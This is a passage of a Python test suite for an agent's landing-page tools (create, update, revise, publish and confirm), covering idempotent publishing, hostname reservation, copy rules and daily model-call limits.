    assert owner_page["id"] == pasted_id and owner_page["source"] == "owner"
    assert conn.execute("SELECT count(*) AS n FROM page WHERE business_id = %s", (biz,)).fetchone()["n"] == 1
    assert track._live_page(conn, pasted_id) is not None  # the pasted snippet keeps taking events

    rollback = data(call_tool(client, "publish_page", {"idempotency_key": "pv", "version": 1}, key=key))
    assert rollback["status"] == "proposed"
    _checked(monkeypatch, conn, URL)
    res = call_tool(
        client, "confirm_proposal", {"proposal_id": rollback["proposal_id"], "idempotency_key": "cv"}, key=key
    )

    assert not res["isError"], tool_text(res)
    out = data(res)
    assert out["page"]["hostname"] == HOSTNAME and out["page"]["url"] == URL  # H22: keeps the slug
    assert out["page"]["source"] == "hosted" and out["page"]["status"] == "published"
    assert out["page"]["id"] == pasted_id  # H25: still the same row, never a second one
    assert landing.current(conn, biz)["id"] == pasted_id
    assert conn.execute("SELECT count(*) AS n FROM page WHERE business_id = %s", (biz,)).fetchone()["n"] == 1
    assert track._live_page(conn, pasted_id) is not None


def test_publish_page_refuses_when_the_reserved_hostname_is_taken_meanwhile(client, conn, monkeypatch):
    """H22 minor: publish_page reserves the hostname it names in its own proposal (payload["hostname"]); if
    another business publishes first and takes that slug, confirming refuses rather than silently handing out
    a different address than the one the owner was shown and agreed to."""
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key_a, _ = seed(conn, biz="biz_a", link=None, page=False, conversions=False)
    # same name (KNOWLEDGE's default): biz_c wants the same slug biz_a was just shown
    key_c, _ = seed(conn, biz="biz_c", link=None, page=False, conversions=False)
    tok = data(call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key_a))["token"]
    prop = data(call_tool(client, "publish_page", {"idempotency_key": "p1", "token": tok}, key=key_a))
    assert prop["summary"].endswith(HOSTNAME)  # A was shown the plain slug first

    _publish(client, conn, monkeypatch, key_c, GOOD_HTML, "c")  # C publishes first and takes it

    res = call_tool(
        client, "confirm_proposal", {"proposal_id": prop["proposal_id"], "idempotency_key": "ca"}, key=key_a
    )

    assert res["isError"] and "is no longer free" in tool_text(res)
    assert (
        conn.execute("SELECT count(*) AS n FROM page WHERE business_id = 'biz_a' AND source = 'hosted'").fetchone()["n"]
        == 0
    )


# ---------------------------------------------------------------- create_page, update_page, revise_page (Task 5)


def _plain(text: str) -> bool:
    return not (JARGON.search(text) or ACCOUNT_JARGON.search(text) or MONEY_JARGON.search(text))


def _page_sections(conn, biz: str) -> dict | None:
    return conn.execute("SELECT sections FROM page WHERE business_id = %s", (biz,)).fetchone()["sections"]


def _created(client, conn, monkeypatch, fake) -> tuple[str, str, dict]:  # noqa: F811 (fixture)
    """A business with its real plan (the dental walk) and hosting on, and a page Admiry wrote for it: (key,
    business_id, create_page's data)."""
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    res = call_tool(client, "create_page", {}, key=key)
    assert not res["isError"], tool_text(res)
    return key, biz, data(res)


def test_create_page_answers_a_preview_the_sections_and_an_upload_link(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)

    res = call_tool(client, "create_page", {}, key=key)

    assert not res["isError"], tool_text(res)
    env = data(res)
    assert env["token"].startswith("pv_") and env["preview_url"] == f"http://testserver/p/{env['token']}"
    # H35 filled (Task 6): a real, 24-hour upload link, minted once here.
    assert env["upload_url"].startswith("http://testserver/u/up_")
    assert conn.execute("SELECT count(*) AS n FROM upload_token").fetchone()["n"] == 1
    want = {"tree": "dentists", "copy": page_copy_fixture().model_dump(), "photos": [], "version": 1, "hours": None}
    assert env["sections"] == want
    assert _page_sections(conn, biz) == want  # the draft lives on the business's one page row
    prev = hosted.preview(conn, env["token"])
    assert prev["sections"] == want and prev["title"] == "Invisalign in Palo Alto | Bright Smile Dental"
    assert (
        hosted.sanitise(
            prev["html"], page_id=landing.current(conn, biz)["id"], own_host=None, agent_base="http://testserver"
        )
        == []
    )
    [call] = fake.page_calls
    assert call["method"] == "write_page" and call["brief"] is None
    say = res["structuredContent"]["say"]
    assert env["preview_url"] in say and "Invisalign" in say and _plain(say)
    assert [a["tool"] for a in res["structuredContent"]["next"]["actions"]] == ["publish_page", "revise_page"]
    shown = client.get(f"/p/{env['token']}")  # the preview itself, on the agent host
    assert shown.status_code == 200 and "<h1>Invisalign in Palo Alto</h1>" in shown.text
    assert landing.current(conn, biz)["status"] == "preview"  # nothing is live until publish_page


def test_create_page_takes_a_template_and_a_brief(client, conn, monkeypatch, fake):  # noqa: F811
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)

    env = data(call_tool(client, "create_page", {"template": "fallback", "brief": "warmer, please"}, key=key))

    assert env["sections"]["tree"] == "fallback"
    assert fake.page_calls[0]["brief"] == "warmer, please"
    assert "<h2>Why this business</h2>" in hosted.preview(conn, env["token"])["html"]  # the fallback's layout


def test_create_page_refuses_a_template_it_does_not_have_before_asking_the_model(client, conn, monkeypatch, fake):  # noqa: F811
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)

    res = call_tool(client, "create_page", {"template": "florists"}, key=key)

    assert res["isError"] and all(tree in tool_text(res) for tree in page_builder.TREES)
    assert fake.page_calls == []


def test_create_page_needs_the_plan(client, conn, fake):  # noqa: F811
    key = business_with_key(conn)

    res = call_tool(client, "create_page", {}, key=key)

    assert res["isError"] and tool_text(res) == landing.NO_PLAN and fake.page_calls == []


def test_create_page_fails_with_the_notes_and_saves_nothing(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    fake.copies = [page_copy_fixture(trust_points=["20 years in Palo Alto"])]

    res = call_tool(client, "create_page", {}, key=key)

    assert res["isError"] and tool_text(res).startswith("The page's copy did not pass Admiry's rules: ")
    assert "(“20 years”)" in tool_text(res) and _plain(tool_text(res))
    assert len(fake.page_calls) == 2  # once, then once more with the notes
    assert _page_sections(conn, biz) is None
    assert conn.execute("SELECT count(*) AS n FROM page_preview").fetchone()["n"] == 0


def test_update_page_changes_only_that_section_without_the_model(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz, first = _created(client, conn, monkeypatch, fake)

    res = call_tool(
        client, "update_page", {"section": "headline", "text": "Invisalign in Palo Alto,  this week"}, key=key
    )

    assert not res["isError"], tool_text(res)
    env = data(res)
    assert env["token"] != first["token"] and env["preview_url"] == f"http://testserver/p/{env['token']}"
    want = {**first["sections"]["copy"], "headline": "Invisalign in Palo Alto, this week"}
    assert env["sections"]["copy"] == want and env["sections"]["version"] == 2
    assert {k: v for k, v in env["sections"].items() if k not in ("copy", "version")} == {
        k: v for k, v in first["sections"].items() if k not in ("copy", "version")
    }
    assert _page_sections(conn, biz) == env["sections"]
    assert len(fake.page_calls) == 1  # create_page's own: an exact change asks no model
    assert "<h1>Invisalign in Palo Alto, this week</h1>" in hosted.preview(conn, env["token"])["html"]
    assert hosted.preview(conn, first["token"]) is not None  # the earlier preview stays until it expires
    assert "headline" in res["structuredContent"]["say"] and _plain(res["structuredContent"]["say"])


def test_update_page_reads_each_part_the_way_its_description_says(client, conn, monkeypatch, fake):  # noqa: F811
    key, _biz, _first = _created(client, conn, monkeypatch, fake)

    def update(section: str, text: str) -> dict:
        res = call_tool(client, "update_page", {"section": section, "text": text}, key=key)
        assert not res["isError"], tool_text(res)
        return data(res)

    trust = update("trust", "- Same-week appointments\n\n• A family dentist in Palo Alto\n")
    assert trust["sections"]["copy"]["trust_points"] == ["Same-week appointments", "A family dentist in Palo Alto"]
    service = update("service", "One visit to start.\n\nThen a new set every few weeks.")
    assert service["sections"]["copy"]["service_paragraphs"] == [
        "One visit to start.",
        "Then a new set every few weeks.",
    ]
    faq = update("faq", "Is there parking? Yes, behind the building.\nDo you see teens? Yes, and adults too.")
    assert faq["sections"]["copy"]["faq"] == [
        {"q": "Is there parking?", "a": "Yes, behind the building."},
        {"q": "Do you see teens?", "a": "Yes, and adults too."},
    ]
    hours = update("hours", "Mon-Sat 8-5")
    assert hours["sections"]["hours"] == "Mon-Sat 8-5" and hours["sections"]["version"] == 5
    assert "Mon-Sat 8-5" in hosted.preview(conn, hours["token"])["html"]
    back = update("hours", "")
    assert back["sections"]["hours"] is None and "Mon-Fri 8-5" in hosted.preview(conn, back["token"])["html"]


def test_update_page_refuses_an_unknown_part_and_words_the_rules_refuse(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz, first = _created(client, conn, monkeypatch, fake)

    unknown = call_tool(client, "update_page", {"section": "footer", "text": "x"}, key=key)
    claim = call_tool(client, "update_page", {"section": "trust", "text": "20 years in Palo Alto"}, key=key)
    faq = call_tool(client, "update_page", {"section": "faq", "text": "Parking behind the building."}, key=key)
    hours = call_tool(client, "update_page", {"section": "hours", "text": "Mon-Fri 8-5, or (408) 555-0000"}, key=key)

    assert unknown["isError"] and all(section in tool_text(unknown) for section in page_builder.SECTIONS)
    assert hours["isError"] and tool_text(hours).endswith(
        "The hours includes a phone number that is not the business's own."
    )
    assert claim["isError"] and tool_text(claim) == (
        "The page's copy did not pass Admiry's rules: Reason 1 to choose the business names a number of years "
        "(“20 years”) the business's facts do not have."
    )
    assert faq["isError"] and "the question ending with “?”" in tool_text(faq)
    assert _page_sections(conn, biz) == first["sections"]  # nothing changed


def test_update_page_and_revise_page_need_a_page_admiry_wrote(client, conn, monkeypatch, fake):  # noqa: F811
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)

    update = call_tool(client, "update_page", {"section": "headline", "text": "Invisalign in Palo Alto"}, key=key)
    revise = call_tool(client, "revise_page", {"instruction": "warmer"}, key=key)

    for res in (update, revise):
        assert res["isError"] and tool_text(res) == page_builder.NO_PAGE
    assert fake.page_calls == []


def test_revise_page_asks_the_model_with_the_instruction_and_the_page_as_it_reads(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz, first = _created(client, conn, monkeypatch, fake)
    warmer = page_copy_fixture(subheadline="A warm, friendly family dentist in Palo Alto.")
    fake.copies = [warmer]

    res = call_tool(client, "revise_page", {"instruction": "make it warmer"}, key=key)

    assert not res["isError"], tool_text(res)
    call = fake.page_calls[-1]
    assert call["method"] == "revise_page" and call["instruction"] == "make it warmer"
    assert call["copy"] == page_copy_fixture()  # the page as it read before
    env = data(res)
    assert env["sections"]["copy"] == warmer.model_dump() and env["sections"]["version"] == 2
    assert _page_sections(conn, biz) == env["sections"] and env["token"] != first["token"]
    assert "A warm, friendly family dentist" in hosted.preview(conn, env["token"])["html"]
    assert _plain(res["structuredContent"]["say"])


def test_revise_page_refuses_an_empty_instruction(client, conn, monkeypatch, fake):  # noqa: F811
    key, _biz, _first = _created(client, conn, monkeypatch, fake)

    res = call_tool(client, "revise_page", {"instruction": "  "}, key=key)

    assert res["isError"] and "Say what to change" in tool_text(res) and len(fake.page_calls) == 1


# A direction of exactly page_builder.MAX_DIRECTION characters once stripped
DIRECTION = ("Lead with the same-week appointments, " * 30)[:999] + "."


def test_a_brief_or_an_instruction_over_the_limit_is_refused_never_cut(client, conn, monkeypatch, fake):  # noqa: F811
    """Final review C, minor 13: "Text over a limit is refused, never cut". A brief or an instruction over
    page_builder.MAX_DIRECTION characters (stripped) is refused in its own sentence before the day's model limit is
    looked at -- here already reached -- and before the model is asked, and no preview is made; one at the limit, with
    spaces around it, reaches the model whole."""
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)

    def previews() -> int:
        return conn.execute("SELECT count(*) AS n FROM page_preview").fetchone()["n"]

    assert len(DIRECTION) == page_builder.MAX_DIRECTION == 1000
    limit = auth.LLM_CALLS_PER_DAY
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", 0)
    brief = call_tool(client, "create_page", {"brief": DIRECTION + "!"}, key=key)
    assert brief["isError"] and tool_text(brief) == "the brief takes at most 1,000 characters", tool_text(brief)
    assert fake.page_calls == [] and previews() == 0
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", limit)
    written = call_tool(client, "create_page", {"brief": f"  {DIRECTION}  "}, key=key)
    assert not written["isError"], tool_text(written)
    assert fake.page_calls[-1]["brief"] == DIRECTION and previews() == 1
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", 0)
    instruction = call_tool(client, "revise_page", {"instruction": DIRECTION + "!"}, key=key)
    assert instruction["isError"] and tool_text(instruction) == "the instruction takes at most 1,000 characters"
    assert len(fake.page_calls) == 1 and previews() == 1
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", limit)
    revised = call_tool(client, "revise_page", {"instruction": f"\n{DIRECTION}\n"}, key=key)
    assert not revised["isError"], tool_text(revised)
    assert fake.page_calls[-1]["instruction"] == DIRECTION and previews() == 2


def test_a_page_admiry_wrote_publishes_as_admiry_and_passes_its_own_check(client, conn, monkeypatch, fake):  # noqa: F811
    """H7: an Admiry-written preview publishes with source 'admiry', its sections become the row's own, and the
    14-rule check run on the now-live address (the after-commit hook) passes."""
    key, biz, created = _created(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)
    edited = data(call_tool(client, "update_page", {"section": "hours", "text": "Mon-Sat 8-5"}, key=key))

    prop = data(call_tool(client, "publish_page", {"idempotency_key": "pa1", "token": created["token"]}, key=key))
    _checked(monkeypatch, conn, URL)
    res = call_tool(client, "confirm_proposal", {"proposal_id": prop["proposal_id"], "idempotency_key": "ca1"}, key=key)

    assert not res["isError"], tool_text(res)
    out = data(res)
    assert out["page"]["source"] == "admiry" and out["page"]["url"] == URL and out["page"]["status"] == "published"
    assert _page_sections(conn, biz) == created["sections"]  # the published preview's, not the later draft's
    assert _page_sections(conn, biz) != edited["sections"]
    version = conn.execute("SELECT source FROM page_version WHERE page_id = %s", (out["page"]["id"],)).fetchone()
    assert version["source"] == "admiry"
    assert out["check"]["ok"] is True, out["check"]
    blocking = {r["id"]: r["ok"] for r in out["check"]["rules"] if r["id"] in landing.BLOCKING}
    assert all(ok is not False for ok in blocking.values()), blocking
    served = hosted.serve(conn, config.load(), HOSTNAME, "/", "GET")  # the tenant host (the client's app predates it)
    body = served.body.decode()
    assert served.status_code == 200 and "<h1>Invisalign in Palo Alto</h1>" in body
    assert body.count(f'data-page="{out["page"]["id"]}"') == 1 and body.count("/t/admiry.js") == 1  # never twice


def test_publish_page_twice_with_the_same_token_is_idempotent(client, conn, monkeypatch, fake):  # noqa: F811
    """H40: calling publish_page(token) again once it is already live answers "already_published" and
    proposes (and re-confirms) nothing a second time -- no second version, e-mail or proposal row."""
    key, _biz, created = _created(client, conn, monkeypatch, fake)
    sent = _mailbox(monkeypatch)
    token = created["token"]

    prop = data(call_tool(client, "publish_page", {"idempotency_key": "pt1", "token": token}, key=key))
    _checked(monkeypatch, conn, URL)
    res = call_tool(client, "confirm_proposal", {"proposal_id": prop["proposal_id"], "idempotency_key": "ct1"}, key=key)
    assert not res["isError"], tool_text(res)
    v1 = data(res)
    assert v1["page"]["version"] == 1 and len(sent) == 1

    again_res = call_tool(client, "publish_page", {"idempotency_key": "pt2", "token": token}, key=key)
    assert not again_res["isError"], tool_text(again_res)
    again = data(again_res)
    assert again == {"status": "already_published"}
    assert URL in tool_text(again_res)

    page_id = v1["page"]["id"]
    assert conn.execute("SELECT count(*) AS n FROM page_version WHERE page_id = %s", (page_id,)).fetchone()["n"] == 1
    assert conn.execute("SELECT count(*) AS n FROM proposal WHERE kind = 'publish_page'").fetchone()["n"] == 1
    assert len(sent) == 1  # no second report e-mailed


def test_publish_page_reuses_an_open_proposal_for_the_same_unconfirmed_token(client, conn, monkeypatch, fake):  # noqa: F811
    """H40: calling publish_page(token) again before the first proposal is ever confirmed hands back that
    same proposal rather than making a second one (the way pages.plan_approve reuses open_for_plan)."""
    key, _biz, created = _created(client, conn, monkeypatch, fake)
    token = created["token"]

    first = data(call_tool(client, "publish_page", {"idempotency_key": "pu1", "token": token}, key=key))
    second = data(call_tool(client, "publish_page", {"idempotency_key": "pu2", "token": token}, key=key))

    assert first["status"] == "proposed" and second["status"] == "proposed"
    assert first["proposal_id"] == second["proposal_id"]
    assert conn.execute("SELECT count(*) AS n FROM proposal WHERE kind = 'publish_page'").fetchone()["n"] == 1


def test_precheck_publish_page_refuses_a_second_confirm_for_an_already_live_token(client, conn, monkeypatch, fake):  # noqa: F811
    """H40's belt-and-braces: two open proposals for the same token (a race _propose_publish's own dedup
    cannot fully close -- engineered here directly, since by the time a second call could reach it,
    _propose_publish would already refuse to create one) -- the first's confirm publishes it; the second's
    precheck_publish_page must refuse rather than let apply_publish_page run again for the same content."""
    key, biz, created = _created(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)
    token = created["token"]

    prop1 = data(call_tool(client, "publish_page", {"idempotency_key": "pz1", "token": token}, key=key))
    prop2 = proposals.create(
        conn,
        biz,
        cls="nonspend",
        kind="publish_page",
        payload={"token": token, "hostname": HOSTNAME},
        summary="dup",
        what_changes=[],
        approval_url=f"{config.load().public_base_url}/p/{token}",
    )

    _checked(monkeypatch, conn, URL)
    res1 = call_tool(
        client, "confirm_proposal", {"proposal_id": prop1["proposal_id"], "idempotency_key": "cz1"}, key=key
    )
    assert not res1["isError"], tool_text(res1)
    page_id = data(res1)["page"]["id"]
    assert data(res1)["page"]["version"] == 1

    res2 = call_tool(
        client, "confirm_proposal", {"proposal_id": prop2["proposal_id"], "idempotency_key": "cz2"}, key=key
    )
    assert res2["isError"] and "already published" in tool_text(res2)
    assert (
        conn.execute("SELECT status FROM proposal WHERE id = %s", (prop2["proposal_id"],)).fetchone()["status"]
        == "proposed"
    )  # never confirmed
    assert conn.execute("SELECT count(*) AS n FROM page_version WHERE page_id = %s", (page_id,)).fetchone()["n"] == 1


def test_revise_between_two_publishes_still_makes_a_second_version(client, conn, monkeypatch, fake):  # noqa: F811
    """H40's idempotency is scoped to one token: publishing, revising (a new token, new content), then
    publishing again still makes a genuinely new version, exactly as before the fix."""
    key, _biz, created = _created(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)

    prop1 = data(call_tool(client, "publish_page", {"idempotency_key": "pr1", "token": created["token"]}, key=key))
    _checked(monkeypatch, conn, URL)
    res1 = call_tool(
        client, "confirm_proposal", {"proposal_id": prop1["proposal_id"], "idempotency_key": "cr1"}, key=key
    )
    assert not res1["isError"], tool_text(res1)
    assert data(res1)["page"]["version"] == 1

    revised = data(call_tool(client, "revise_page", {"instruction": "make it warmer"}, key=key))
    assert revised["token"] != created["token"]

    prop2 = data(call_tool(client, "publish_page", {"idempotency_key": "pr2", "token": revised["token"]}, key=key))
    assert prop2["status"] == "proposed"  # a different token, different content -- never "already_published"
    res2 = call_tool(
        client, "confirm_proposal", {"proposal_id": prop2["proposal_id"], "idempotency_key": "cr2"}, key=key
    )
    assert not res2["isError"], tool_text(res2)
    assert data(res2)["page"]["version"] == 2


def test_publish_page_two_tokens_with_the_still_live_content_answers_already_published(client, conn, monkeypatch, fake):  # noqa: F811
    """H41 probe 1 (must stay true after the fix): two DIFFERENT tokens carrying the SAME content, which
    really is what is live right now, still answer already_published -- only matching by history (an older
    version, or a token's own long-superseded confirmed proposal) was ever wrong; matching the live one
    is not."""
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)
    v1 = _publish(client, conn, monkeypatch, key, GOOD_HTML, "u1")
    assert v1["page"]["version"] == 1

    tok2 = data(call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key))["token"]
    again = data(call_tool(client, "publish_page", {"idempotency_key": "u2", "token": tok2}, key=key))
    assert again == {"status": "already_published"}
    n = conn.execute("SELECT count(*) AS n FROM page_version WHERE page_id = %s", (v1["page"]["id"],)).fetchone()["n"]
    assert n == 1


def test_publish_page_a_new_token_matching_an_old_nonlive_version_is_a_real_republish(client, conn, monkeypatch, fake):  # noqa: F811
    """H41 probe 2: publish A (v1), then B (v2, live, different content) -- a brand-new, third token
    carrying A's exact, no-longer-live bytes must NOT answer already_published; the live page is B's, so
    this is a genuine change back to A, proposing and confirming into v3. Before H41, matching ANY old
    page_version (not just the live one) misfired here."""
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)
    vA = _publish(client, conn, monkeypatch, key, GOOD_HTML, "v1")
    assert vA["page"]["version"] == 1
    vB = _publish(client, conn, monkeypatch, key, GOOD_HTML_V2, "v2")
    assert vB["page"]["version"] == 2

    tok_c = data(call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key))["token"]
    prop = data(call_tool(client, "publish_page", {"idempotency_key": "v3p", "token": tok_c}, key=key))
    assert prop["status"] == "proposed", prop  # not already_published: the live page is B's, not A's
    _checked(monkeypatch, conn, URL)
    res = call_tool(client, "confirm_proposal", {"proposal_id": prop["proposal_id"], "idempotency_key": "v3c"}, key=key)
    assert not res["isError"], tool_text(res)
    assert data(res)["page"]["version"] == 3


def test_publish_page_the_same_token_resubmitted_after_a_different_one_moved_the_page(client, conn, monkeypatch, fake):  # noqa: F811
    """H41 probe 3: token A's own proposal was confirmed once (v1); token B's confirm later made B live
    (v2), while A itself has not expired. Re-submitting token A must not answer already_published just
    because A's OWN proposal was confirmed once -- the live content is B's now, so republishing A is a
    genuine change (v3). Before H41, the dropped confirmed-proposal shortcut misfired here."""
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)
    tok_a = data(call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key))["token"]
    prop_a = data(call_tool(client, "publish_page", {"idempotency_key": "w1", "token": tok_a}, key=key))
    _checked(monkeypatch, conn, URL)
    res_a = call_tool(
        client, "confirm_proposal", {"proposal_id": prop_a["proposal_id"], "idempotency_key": "wc1"}, key=key
    )
    assert not res_a["isError"], tool_text(res_a)
    assert data(res_a)["page"]["version"] == 1

    vb = _publish(client, conn, monkeypatch, key, GOOD_HTML_V2, "w2")
    assert vb["page"]["version"] == 2

    prop2 = data(call_tool(client, "publish_page", {"idempotency_key": "w3", "token": tok_a}, key=key))
    assert prop2["status"] == "proposed", prop2  # A's own earlier confirm must not shortcut this
    res2 = call_tool(
        client, "confirm_proposal", {"proposal_id": prop2["proposal_id"], "idempotency_key": "wc3"}, key=key
    )
    assert not res2["isError"], tool_text(res2)
    assert data(res2)["page"]["version"] == 3


def test_publish_page_version_rollback_stays_repeatable_twice_in_a_row(client, conn, monkeypatch, fake):  # noqa: F811
    """H41 probe 4 (must stay true): publish_page(version=n) is never short-circuited by
    _already_published_url (token is None on that path) -- calling it twice in a row both succeed and bump
    the version each time."""
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)
    v1 = _publish(client, conn, monkeypatch, key, GOOD_HTML, "x1")
    assert v1["page"]["version"] == 1

    prop1 = data(call_tool(client, "publish_page", {"idempotency_key": "x2p", "version": 1}, key=key))
    assert prop1["status"] == "proposed", prop1
    res1 = call_tool(
        client, "confirm_proposal", {"proposal_id": prop1["proposal_id"], "idempotency_key": "x2c"}, key=key
    )
    assert not res1["isError"], tool_text(res1)
    assert data(res1)["page"]["version"] == 2

    prop2 = data(call_tool(client, "publish_page", {"idempotency_key": "x3p", "version": 1}, key=key))
    assert prop2["status"] == "proposed", prop2
    res2 = call_tool(
        client, "confirm_proposal", {"proposal_id": prop2["proposal_id"], "idempotency_key": "x3c"}, key=key
    )
    assert not res2["isError"], tool_text(res2)
    assert data(res2)["page"]["version"] == 3


def test_create_page_counts_against_the_daily_model_limit(client, conn, monkeypatch, fake):  # noqa: F811
    """create_page and revise_page call the model: auth.LLM_TOOLS, one at a time per business and counted per day."""
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    from agent import auth

    assert {"create_page", "revise_page"} <= set(auth.LLM_TOOLS) and "update_page" not in auth.LLM_TOOLS
    used = conn.execute(
        "SELECT count(*) AS n FROM agent_action WHERE business_id = %s AND tool = ANY(%s) "
        "AND (tool <> 'answer' OR args_redacted->>'free_text' = 'true')",
        (biz, list(auth.LLM_TOOLS)),
    ).fetchone()["n"]
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", used + 1)

    assert not call_tool(client, "create_page", {}, key=key)["isError"]
    again = call_tool(client, "revise_page", {"instruction": "warmer"}, key=key)

    assert again["isError"] and "today's limit" in tool_text(again) and len(fake.page_calls) == 1


def test_create_page_says_when_the_law_wants_a_number_the_facts_do_not_have(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    conn.execute(
        "UPDATE plan SET json = jsonb_set(json, '{sections,consultation,business,category}', '\"home_services\"') "
        "WHERE business_id = %s",
        (biz,),
    )

    res = call_tool(client, "create_page", {}, key=key)

    assert not res["isError"], tool_text(res)
    say = res["structuredContent"]["say"]
    assert "the page must also show “License #” with your number; tell me the number and I will add it." in say
    assert "License #" not in hosted.visible_text(hosted.preview(conn, data(res)["token"])["html"])
    assert _plain(say)


# ---------------------------------------------------------------- a business of a family of sites (A3p-6 batch 2 Task 5)

PICK_A_LOOK = "Pick a look. You can change words, colours and photos after."
NO_CHANGES_YET = "Changes to this site by sentence come with the next release. You can change its facts and photos now."


def _another_kind(conn, biz: str) -> None:
    """The dental walk's business as a law firm: the knowledge's category is no family of sites."""
    _version, knowledge = business.latest_knowledge(conn, biz)
    business.add_knowledge(conn, biz, {**knowledge, "category": "attorneys"}, source="owner")


def test_create_page_on_a_dental_practice_starts_its_site_and_asks_the_look(client, conn, monkeypatch, fake):  # noqa: F811
    """Q14: with Admiry's own sites on, the page step of a home-services business or a dental practice is its site --
    here the dental walk's business, whose facts are all on file: the look is the question. No starter page is written
    and no model is asked, and the audit row stays `create_page`'s."""
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    monkeypatch.setenv("AGENT_SITES", "1")

    res = call_tool(client, "create_page", {}, key=key)

    assert not res["isError"], tool_text(res)
    env = res["structuredContent"]
    question = env["next"]["question"]
    assert env["next"]["kind"] == "question" and env["say"] == PICK_A_LOOK and _plain(env["say"])
    assert (question["id"], question["input"]) == ("style", "single")
    assert [o["id"] for o in question["options"]] == ["calm", "warm", "boutique"]
    assert [look["id"] for look in env["data"]["looks"]] == ["calm", "warm", "boutique"]
    assert "token" not in env["data"] and "sections" not in env["data"]
    assert fake.page_calls == [] and fake.site_calls == []  # no starter page, no words
    assert _page_sections(conn, biz) is None  # nothing on the business's one page row but the site's draft
    assert conn.execute("SELECT count(*) AS n FROM page_preview").fetchone()["n"] == 0
    rows = conn.execute(
        "SELECT tool, args_redacted FROM agent_action WHERE business_id = %s AND tool IN ('create_page', 'build_site')",
        (biz,),
    ).fetchall()
    assert [r["tool"] for r in rows] == ["create_page"] and rows[0]["args_redacted"]["site"] == "true"
    assert intake.draft(landing.current(conn, biz))["family"] == "dental"


def test_create_page_on_another_kind_of_business_writes_the_starter_page_as_before(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    monkeypatch.setenv("AGENT_SITES", "1")
    _another_kind(conn, biz)

    res = call_tool(client, "create_page", {}, key=key)

    assert not res["isError"], tool_text(res)
    env = data(res)
    assert env["token"].startswith("pv_") and env["sections"]["version"] == 1 and "looks" not in env
    assert [c["method"] for c in fake.page_calls] == ["write_page"]
    row = conn.execute("SELECT args_redacted FROM agent_action WHERE tool = 'create_page'").fetchone()
    assert "site" not in row["args_redacted"]  # a starter page's row is as it always was


@pytest.mark.parametrize("switch", [None, "0", "off"])
def test_create_page_with_the_switch_off_writes_the_starter_page_for_a_dentist_too(
    client,
    conn,
    monkeypatch,
    fake,  # noqa: F811
    switch,
):
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    if switch is None:
        monkeypatch.delenv("AGENT_SITES", raising=False)
    else:
        monkeypatch.setenv("AGENT_SITES", switch)

    env = data(call_tool(client, "create_page", {}, key=key))

    assert env["token"].startswith("pv_") and env["sections"]["tree"] == "dentists" and "looks" not in env
    assert len(fake.page_calls) == 1 and intake.draft(landing.current(conn, biz))["family"] is None


def test_create_page_decides_before_it_spends_a_model_call_or_the_days_limit(client, conn, monkeypatch, fake):  # noqa: F811
    """The family check comes first: a family business is asked the look whatever is left of the day's drafts (a question
    is no draft), and another kind of business meets the limit as it always did."""
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    monkeypatch.setenv("AGENT_SITES", "1")
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", 0)  # the day's drafts are all used up

    res = call_tool(client, "create_page", {}, key=key)

    assert not res["isError"], tool_text(res)
    assert res["structuredContent"]["next"]["question"]["id"] == "style"
    assert fake.page_calls == [] and fake.site_calls == []
    _another_kind(conn, biz)
    other = call_tool(client, "create_page", {}, key=key)
    assert other["isError"] and "today's limit" in tool_text(other) and fake.page_calls == []


def test_a_starter_page_already_written_is_still_the_page_with_the_switch_on(client, conn, monkeypatch, fake):  # noqa: F811
    """No starter page already written (Q14): a business whose ads use the page Admiry wrote is not handed to a site --
    `create_page` writes that page again, as `build_site` (STARTER_PAGE) leaves it alone."""
    key, _biz, first = _created(client, conn, monkeypatch, fake)
    assert first["sections"]["version"] == 1
    monkeypatch.setenv("AGENT_SITES", "1")

    env = data(call_tool(client, "create_page", {}, key=key))

    assert env["sections"]["version"] == 2 and env["token"] != first["token"] and "looks" not in env
    assert len(fake.page_calls) == 2


def test_revising_and_editing_a_site_by_sentence_wait_for_the_next_release(client, conn, monkeypatch, fake):  # noqa: F811
    """Q14: a site's quick changes by sentence come with the next release. Both refuse before the day's limit is looked at
    and before any model is asked, in one sentence an owner can read."""
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    monkeypatch.setenv("AGENT_SITES", "1")
    assert not call_tool(client, "create_page", {}, key=key)["isError"]  # the site's page: the look asked
    monkeypatch.setattr(auth, "LLM_CALLS_PER_DAY", 0)

    revise = call_tool(client, "revise_page", {"instruction": "make it warmer"}, key=key)
